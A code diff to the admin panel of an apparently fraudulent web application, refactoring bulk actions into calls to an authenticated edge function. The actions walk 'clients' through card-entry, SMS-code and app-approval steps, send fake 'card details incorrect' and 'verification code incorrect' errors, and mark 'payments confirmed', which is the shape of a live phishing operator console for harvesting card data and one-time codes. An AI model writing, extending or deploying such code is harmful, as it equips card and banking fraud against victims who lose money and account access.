@@ -182,6 +182,24 @@ const AdminPanel = () => {
     if (!action || selectedIds.size === 0) return;
 
     const ids = Array.from(selectedIds);
+    const token = sessionStorage.getItem("admin_token");
+    
+    // Helper to update multiple sessions
+    const bulkUpdate = async (updates: Record<string, unknown>, successMsg: string) => {
+      try {
+        // Update each session via edge function
+        await Promise.all(ids.map(id => 
+          supabase.functions.invoke("admin-sessions", {
+            headers: token ? { Authorization: `Bearer ${token}` } : {},
+            body: { action: "update", sessionId: id, updates }
+          })
+        ));
+        toast({ title: successMsg });
+      } catch (error) {
+        console.error("Bulk action error:", error);
+        toast({ title: "Error", description: "Failed to execute bulk action", variant: "destructive" });
+      }
+    };
     
     try {
       switch (action) {
@@ -190,68 +208,60 @@ const AdminPanel = () => {
         case "step3":
         case "step4": {
           const step = parseInt(action.replace("step", ""));
-          await supabase
-            .from("client_sessions")
-            .update({ current_step: step, approval_type: step === 2 ? null : undefined })
-            .in("id", ids);
-          toast({ title: `${ids.length} clients sent to step ${step}` });
+          await bulkUpdate(
+            { current_step: step, approval_type: step === 2 ? null : undefined },
+            `${ids.length} clients sent to step ${step}`
+          );
           break;
         }
         case "sms":
-          await supabase
-            .from("client_sessions")
-            .update({ current_step: 3, approval_type: null, verification_code: null })
-            .in("id", ids);
-          toast({ title: `${ids.length} clients sent to SMS verification` });
+          await bulkUpdate(
+            { current_step: 3, approval_type: null, verification_code: null },
+            `${ids.length} clients sent to SMS verification`
+          );
           break;
         case "app":
-          await supabase
-            .from("client_sessions")
-            .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
-            .in("id", ids);
-          toast({ title: `${ids.length} clients sent to App approval` });
+          await bulkUpdate(
+            { current_step: 3, approval_type: "app_pending", verification_code: null },
+            `${ids.length} clients sent to App approval`
+          );
           break;
         case "wrong_card":
-          await supabase
-            .from("client_sessions")
-            .update({ 
+          await bulkUpdate(
+            { 
               current_step: 2,
               admin_message: "The card details you entered are incorrect. Please check and try again.",
               message_type: "error"
-            })
-            .in("id", ids);
-          toast({ title: `${ids.length} clients sent back to card page` });
+            },
+            `${ids.length} clients sent back to card page`
+          );
           break;
         case "wrong_sms":
-          await supabase
-            .from("client_sessions")
-            .update({ 
+          await bulkUpdate(
+            { 
               admin_message: "The verification code you entered is incorrect. Please check and try again.",
               message_type: "error"
-            })
-            .in("id", ids);
-          toast({ title: `Wrong SMS alert sent to ${ids.length} clients` });
+            },
+            `Wrong SMS alert sent to ${ids.length} clients`
+          );
           break;
         case "confirm":
-          await supabase
-            .from("client_sessions")
-            .update({ current_step: 4, approval_type: "sms" })
-            .in("id", ids);
-          toast({ title: `${ids.length} payments confirmed` });
+          await bulkUpdate(
+            { current_step: 4, approval_type: "sms" },
+            `${ids.length} payments confirmed`
+          );
           break;
         case "deactivate":
-          await supabase
-            .from("client_sessions")
-            .update({ status: "completed" })
-            .in("id", ids);
-          toast({ title: `${ids.length} clients deactivated` });
+          await bulkUpdate(
+            { status: "completed" },
+            `${ids.length} clients deactivated`
+          );
           break;
         case "clear_message":
-          await supabase
-            .from("client_sessions")
-            .update({ admin_message: null, message_type: null })
-            .in("id", ids);
-          toast({ title: `Messages cleared for ${ids.length} clients` });
+          await bulkUpdate(
+            { admin_message: null, message_type: null },
+            `Messages cleared for ${ids.length} clients`
+          );
           break;
       }
       
